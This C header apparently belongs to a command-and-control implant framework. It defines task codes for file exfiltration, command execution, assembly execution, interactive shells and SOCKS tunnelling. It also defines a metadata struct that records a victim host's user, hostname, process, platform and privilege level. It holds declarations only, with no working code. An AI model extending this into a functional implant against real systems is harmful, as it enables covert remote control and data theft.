#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <stdint.h>

#define TASK_NOP            0
#define TASK_EXIT           1
#define TASK_SET            2
#define TASK_FILE_STAGE     3
#define TASK_FILE_EXFIL     4
#define TASK_RUN            12
#define TASK_EXEC_ASSEMBLY  14
#define TASK_INTERACTIVE    20
#define TASK_SHELL_START    21
#define TASK_SHELL_INPUT    22
#define TASK_SHELL_OUTPUT   23
#define TASK_SHELL_STOP     24
#define TASK_SOCKS_OPEN     25
#define TASK_SOCKS_DATA     26
#define TASK_SOCKS_CLOSE    27
#define TASK_SOCKS_ACK      28
#define TASK_SOCKS_START    29
#define TASK_SOCKS_STOP     30

#define CODE_EXIT_NORMAL    0
#define CODE_SET_SLEEP      0
#define CODE_RUN_SHELL      0

#define FLAG_NONE           0x0000
#define FLAG_ERROR          0x0001
#define FLAG_RUNNING        0x0002
#define FLAG_FRAGMENTED     0x0004
#define FLAG_LAST_FRAG      0x0008

#define ARCH_X86            0
#define ARCH_X64            1
#define ARCH_ARM            2
#define ARCH_ARM64          3

#define PLATFORM_LINUX      0
#define PLATFORM_MACOS      1
#define PLATFORM_WINDOWS    2

#define INTEGRITY_UNTRUSTED 0
#define INTEGRITY_LOW       1
#define INTEGRITY_MEDIUM    2
#define INTEGRITY_HIGH      3
#define INTEGRITY_SYSTEM    4

typedef struct {
    uint8_t  type;
    uint8_t  code;
    uint16_t flags;
    uint32_t label;
    uint32_t identifier;
    uint32_t length;
} task_header_t;

typedef struct {
    uint32_t id;
    uint8_t  session_key[32];
    uint32_t sleep;
    uint32_t jitter;
    char     username[256];
    char     hostname[256];
    char     process_name[256];
    uint32_t process_id;
    uint8_t  arch;
    uint8_t  platform;
    uint8_t  integrity;
} implant_metadata_t;

#define TASK_HEADER_SIZE 16

void encode_header(const task_header_t *h, uint8_t *out);
void decode_header(const uint8_t *buf, task_header_t *out);
void encode_run_req(const char *cmd, uint8_t *out, int *out_len);
void decode_run_req(const uint8_t *buf, int buf_len, char *out_cmd, int max_len);
void encode_run_rep(const char *output, uint8_t *out, int *out_len);
void encode_metadata(const implant_metadata_t *meta, uint8_t *out, int *out_len);
int parse_interactive_req(const uint8_t *buf, int buf_len,
                          char *out_host, int max_host, uint16_t *out_port);

#define CONN_SESSION        0
#define CONN_SHELL          1
#define CONN_SOCKS          2

#define CODE_SOCKS_OK       0
#define CODE_SOCKS_FAIL     1

#endif
